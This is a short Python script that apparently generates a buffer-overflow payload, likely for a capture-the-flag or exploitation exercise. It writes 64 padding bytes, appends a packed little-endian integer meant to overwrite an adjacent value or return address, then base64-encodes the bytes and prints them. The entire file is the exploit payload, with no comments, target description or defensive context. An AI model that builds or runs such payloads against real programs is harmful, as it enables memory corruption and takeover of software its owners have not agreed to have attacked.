
import sys
import struct
import base64

buf = b'UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU'
buf += struct.pack('<I', 700288548)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
